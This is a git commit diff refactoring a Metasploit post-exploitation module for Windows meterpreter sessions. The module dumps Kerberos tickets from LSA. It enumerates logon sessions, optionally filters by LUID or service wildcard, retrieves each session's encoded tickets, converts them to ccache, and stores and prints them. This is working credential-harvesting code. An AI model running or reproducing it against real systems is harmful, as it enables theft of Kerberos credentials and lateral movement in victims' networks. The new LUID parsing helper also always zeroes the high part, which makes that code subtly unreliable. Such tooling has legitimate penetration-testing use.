7137820381830b4c831e51aa18fee5c411327d49
Spencer McIntyre <zeroSteiner@gmail.com>
2023-08-18 17:05:06 -0400

    Refactor the module and update output handling

--- modules/post/windows/manage/kerberos_tickets.rb
+++ modules/post/windows/manage/kerberos_tickets.rb
@@ -5,10 +5,12 @@
 
 require 'rex/proto/kerberos/model/kerberos_flags'
 require 'rex/proto/kerberos/model/ticket_flags'
+require 'rex/proto/ms_dtyp'
 
 class MetasploitModule < Msf::Post
   include Msf::Post::Process
   include Msf::Post::Windows::Lsa
+  include Msf::Exploit::Remote::Kerberos::Ticket
 
   # https://learn.microsoft.com/en-us/windows/win32/api/ntsecapi/ne-ntsecapi-security_logon_type
   SECURITY_LOGON_TYPE = {
@@ -26,16 +28,25 @@ class MetasploitModule < Msf::Post
     12 => 'CachedRemoteInteractive',
     13 => 'CachedUnlock'
   }.freeze
+  # https://learn.microsoft.com/en-us/windows/win32/api/ntsecapi/ne-ntsecapi-kerb_protocol_message_type
+  KERB_RETRIEVE_ENCODED_TICKET_MESSAGE = 8
+  KERB_QUERY_TICKET_CACHE_EX_MESSAGE = 14
 
   def initialize(info = {})
     super(
       update_info(
         info,
-        'Name' => '',
+        'Name' => 'Kerberos Ticket Management',
         'Description' => %q{
         },
         'License' => MSF_LICENSE,
         'Author' => [
+          'Will Schroeder', # original idea/research
+          'Spencer McIntyre'
+        ],
+        'References' => [
+          [ 'URL', 'https://github.com/GhostPack/Rubeus' ],
+          [ 'URL', 'https://github.com/wavvs/nanorobeus' ]
         ],
         'Platform' => ['win'],
         'SessionTypes' => %w[meterpreter],
@@ -61,6 +72,20 @@ class MetasploitModule < Msf::Post
         }
       )
     )
+
+    register_options([
+      OptString.new(
+        'LUID',
+        [false, 'An optional logon session LUID to target'],
+        conditions: [ 'ACTION', 'in', %w[SHOW_LUID DUMP_TICKETS]],
+        regex: /^(0x[a-fA-F0-9]{1,16})?$/
+      ),
+      OptString.new(
+        'SERVICE',
+        [false, 'An optional service name wildcard to target (e.g. krbtgt/*)'],
+        conditions: %w[ACTION == DUMP_TICKETS]
+      )
+    ])
   end
 
   def run
@@ -73,10 +98,35 @@ class MetasploitModule < Msf::Post
   end
 
   def action_dump_tickets
-    luid = get_current_luid
-    print_status("Current LUID: #{luid}")
+    handle = lsa_register_logon_process
+    luids = nil
+    if handle
+      if target_luid
+        luids = [ target_luid ]
+      else
+        luids = lsa_enumerate_logon_sessions
+        print_error('Failed to enumerate logon sessions.') if luids.nil?
+      end
+      trusted = true
+    else
+      handle = lsa_connect_untrusted
+      # if we can't register a logon process then we can only act on the current LUID so skip enumeration
+      fail_with(Failure::Unknown, 'Failed to obtain a handle to LSA.') if handle.nil?
+      trusted = false
+    end
+    luids ||= [ get_current_luid ]
 
-    dump_for_luid(luid)
+    print_status("LSA Handle: 0x#{handle.to_s(16).rjust(16, '0')}")
+    auth_package = lsa_lookup_authentication_package(handle, 'kerberos')
+    if auth_package.nil?
+      lsa_deregister_logon_process(handle)
+      fail_with(Failure::Unknown, 'Failed to lookup the Kerberos authentication package.')
+    end
+
+    luids.each do |luid|
+      dump_for_luid(handle, auth_package, luid, null_luid: !trusted)
+    end
+    lsa_deregister_logon_process(handle)
   end
 
   def action_enum_luids
@@ -84,78 +134,55 @@ class MetasploitModule < Msf::Post
     luids = lsa_enumerate_logon_sessions
     fail_with(Failure::Unknown, 'Failed to enumerate logon sessions.') if luids.nil?
     luids.each do |luid|
-      print_status("#{luid} #{luid == current_luid ? ' (Current)' : ''}")
+      logon_session_data_ptr = lsa_get_logon_session_data(luid)
+      unless logon_session_data_ptr
+        print_status("LogonSession LUID: #{luid}")
+        next
+      end
+
+      print_logon_session_summary(logon_session_data_ptr, annotation: luid == current_luid ? '%bld(current)%clr' : '')
+      session.railgun.secur32.LsaFreeReturnBuffer(logon_session_data_ptr.value)
     end
   end
 
   def action_show_luid
-    luid = get_current_luid
-    print_status("Current LUID: #{luid}")
-  end
-
-  def dump_for_luid(luid)
+    current_luid = get_current_luid
+    luid = target_luid || current_luid
     logon_session_data_ptr = lsa_get_logon_session_data(luid)
     return unless logon_session_data_ptr
 
-    handle = lsa_register_logon_process
-    fail_with(Failure::Unknown, 'Failed to obtain a handle to LSA.') if handle.nil?
-    print_status("LSA Handle: 0x#{handle.to_s(16).rjust(16, '0')}")
-    auth_package = lsa_lookup_authentication_package(handle, 'Kerberos')
-    if auth_package.nil?
-      lsa_deregister_logon_process(handle)
-      fail_with(Failure::Unknown, 'Failed to lookup the Kerberos authentication package.')
-    end
+    print_logon_session_summary(logon_session_data_ptr, annotation: luid == current_luid ? '%bld(current)%clr' : '')
+    session.railgun.secur32.LsaFreeReturnBuffer(logon_session_data_ptr.value)
+  end
 
-    sid = '???'
-    if logon_session_data_ptr.contents.psid != 0
-      result = session.railgun.advapi32.ConvertSidToStringSidA(logon_session_data_ptr.contents.psid.to_i, 4)
-      if result
-        sid = session.railgun.util.read_string(result['StringSid'])
-        session.railgun.kernel32.LocalFree(result['StringSid'])
-      end
-    end
+  def dump_for_luid(handle, auth_package, luid, null_luid: false)
+    logon_session_data_ptr = lsa_get_logon_session_data(luid)
+    return unless logon_session_data_ptr
 
-    indented_print do
-      print_status("UserName:              #{read_lsa_unicode_string(logon_session_data_ptr.contents.user_name)}")
-      print_status("Domain:                #{read_lsa_unicode_string(logon_session_data_ptr.contents.logon_domain)}")
-      print_status("LogonId:               #{logon_session_data_ptr.contents.logon_id}")
-      print_status("Session:               #{logon_session_data_ptr.contents.session}")
-      print_status("UserSID:               #{sid}")
-      print_status("AuthenticationPackage: #{read_lsa_unicode_string(logon_session_data_ptr.contents.authentication_package)}")
-      print_status("LogonType:             #{SECURITY_LOGON_TYPE.fetch(logon_session_data_ptr.contents.logon_type.to_i, '???')} (#{logon_session_data_ptr.contents.logon_type.to_i})")
-      print_status("LogonTime:             #{logon_session_data_ptr.contents.logon_time.to_datetime}")
-      print_status("LogonServer:           #{read_lsa_unicode_string(logon_session_data_ptr.contents.logon_server)}")
-      print_status("LogonServerDNSDomain:  #{read_lsa_unicode_string(logon_session_data_ptr.contents.dns_domain_name)}")
-      print_status("UserPrincipalName:     #{read_lsa_unicode_string(logon_session_data_ptr.contents.upn)}")
-      session.railgun.secur32.LsaFreeReturnBuffer(logon_session_data_ptr.value)
+    print_logon_session_summary(logon_session_data_ptr)
+    session.railgun.secur32.LsaFreeReturnBuffer(logon_session_data_ptr.value)
 
-      query_tkt_cache_req = KERB_QUERY_TKT_CACHE_REQUEST.new(message_type: 14, logon_id: logon_session_data_ptr.contents.logon_id)
-      query_tkt_cache_res_ptr = lsa_call_authentication_package(handle, auth_package, query_tkt_cache_req)
-      if query_tkt_cache_res_ptr
+    logon_session_data_ptr.contents.logon_id.clear if null_luid
+    query_tkt_cache_req = KERB_QUERY_TKT_CACHE_REQUEST.new(message_type: KERB_QUERY_TICKET_CACHE_EX_MESSAGE, logon_id: logon_session_data_ptr.contents.logon_id)
+    query_tkt_cache_res_ptr = lsa_call_authentication_package(handle, auth_package, query_tkt_cache_req)
+    if query_tkt_cache_res_ptr
+      indented_print do
         dump_session_tickets(handle, auth_package, logon_session_data_ptr, query_tkt_cache_res_ptr)
-        session.railgun.secur32.LsaFreeReturnBuffer(query_tkt_cache_res_ptr.value)
       end
+      session.railgun.secur32.LsaFreeReturnBuffer(query_tkt_cache_res_ptr.value)
     end
-
-    lsa_deregister_logon_process(handle)
   end
 
   def dump_session_tickets(handle, auth_package, logon_session_data_ptr, query_tkt_cache_res_ptr)
     tkt_cache = KERB_QUERY_TKT_CACHE_RESPONSE_x64.read(query_tkt_cache_res_ptr.contents)
     tkt_cache.tickets.each_with_index do |ticket, index|
       server_name = read_lsa_unicode_string(ticket.server_name)
+      next if datastore['SERVICE'].present? && !File.fnmatch?(datastore['SERVICE'], server_name.split('@').first, File::FNM_CASEFOLD | File::FNM_DOTMATCH)
+
       server_name_wz = session.railgun.util.str_to_uni_z(server_name)
       print_status("Ticket[#{index}]")
       indented_print do
-        print_status("ClientName:     #{read_lsa_unicode_string(ticket.client_name)}")
-        print_status("ServerName:     #{server_name}")
-        print_status("StartTime:      #{ticket.start_time.to_datetime}")
-        print_status("EndTime:        #{ticket.end_time.to_datetime}")
-        print_status("RenewTime:      #{ticket.renew_time.to_datetime}")
-        print_status("EncryptionType: #{Rex::Proto::Kerberos::Crypto::Encryption::IANA_NAMES.fetch(ticket.encryption_type.to_i, ticket.encryption_type.to_i)}")
-        print_status("TicketFlags:    #{Rex::Proto::Kerberos::Model::TicketFlags.new(ticket.ticket_flags.to_i).enabled_flag_names.map(&:to_s).join(', ')}")
-
-        retrieve_tkt_req = KERB_RETRIEVE_TKT_REQUEST_x64.new(message_type: 8, logon_id: logon_session_data_ptr.contents.logon_id, cache_options: 8)
+        retrieve_tkt_req = KERB_RETRIEVE_TKT_REQUEST_x64.new(message_type: KERB_RETRIEVE_ENCODED_TICKET_MESSAGE, logon_id: logon_session_data_ptr.contents.logon_id, cache_options: 8)
         ptr = session.railgun.util.alloc_and_write_data(retrieve_tkt_req.to_binary_s + server_name_wz)
         next if ptr.nil?
 
@@ -172,10 +199,22 @@ class MetasploitModule < Msf::Post
           kirbi_ticket = session.railgun.memread(retrieve_tkt_res.ticket.encoded_ticket, retrieve_tkt_res.ticket.encoded_ticket_size)
           ccache_ticket = kirbi_to_ccache(kirbi_ticket)
           Msf::Exploit::Remote::Kerberos::Ticket::Storage.store_ccache(ccache_ticket, framework_module: self)
+          presenter = Rex::Proto::Kerberos::CredentialCache::Krb5CcachePresenter.new(ccache_ticket)
+          print_line(presenter.present.split("\n").map { |line| "    #{print_prefix}#{line}" }.join("\n"))
         end
         session.railgun.secur32.LsaFreeReturnBuffer(retrieve_tkt_res_ptr.value)
       end
     end
+  end
+
+  def target_luid
+    return nil if datastore['LUID'].blank?
+
+    val = datastore['LUID'].to_i(16)
+    Rex::Proto::MsDtyp::MsDtypLuid.new(
+      high_part: (val & 0xffffffff) >> 32,
+      low_part: (val & 0xffffffff)
+    )
   end
 
   def kirbi_to_ccache(input)
@@ -218,6 +257,30 @@ class MetasploitModule < Msf::Post
     TOKEN_STATISTICS.read(result['TokenInformation'])
   end
 
+  def print_logon_session_summary(logon_session_data_ptr, annotation: nil)
+    sid = '???'
+    if datastore['VERBOSE'] && logon_session_data_ptr.contents.psid != 0
+      result = session.railgun.advapi32.ConvertSidToStringSidA(logon_session_data_ptr.contents.psid.to_i, 4)
+      if result
+        sid = session.railgun.util.read_string(result['StringSid'])
+        session.railgun.kernel32.LocalFree(result['StringSid'])
+      end
+    end
+
+    print_status("LogonSession LUID: #{logon_session_data_ptr.contents.logon_id} #{annotation}")
+    indented_print do
+      print_status("User:                  #{read_lsa_unicode_string(logon_session_data_ptr.contents.logon_domain)}\\#{read_lsa_unicode_string(logon_session_data_ptr.contents.user_name)}")
+      print_status("UserSID:               #{sid}") if datastore['VERBOSE']
+      print_status("Session:               #{logon_session_data_ptr.contents.session}")
+      print_status("AuthenticationPackage: #{read_lsa_unicode_string(logon_session_data_ptr.contents.authentication_package)}")
+      print_status("LogonType:             #{SECURITY_LOGON_TYPE.fetch(logon_session_data_ptr.contents.logon_type.to_i, '???')} (#{logon_session_data_ptr.contents.logon_type.to_i})")
+      print_status("LogonTime:             #{logon_session_data_ptr.contents.logon_time.to_datetime.localtime}")
+      print_status("LogonServer:           #{read_lsa_unicode_string(logon_session_data_ptr.contents.logon_server)}") if datastore['VERBOSE']
+      print_status("LogonServerDNSDomain:  #{read_lsa_unicode_string(logon_session_data_ptr.contents.dns_domain_name)}") if datastore['VERBOSE']
+      print_status("UserPrincipalName:     #{read_lsa_unicode_string(logon_session_data_ptr.contents.upn)}") if datastore['VERBOSE']
+    end
+  end
+
   def peer
     nil # drop the peer prefix from messages
   end
@@ -230,6 +293,6 @@ class MetasploitModule < Msf::Post
   end
 
   def print_prefix
-    super + (' ' * @indent_level * 2)
+    super + (' ' * @indent_level.to_i * 2)
   end
 end
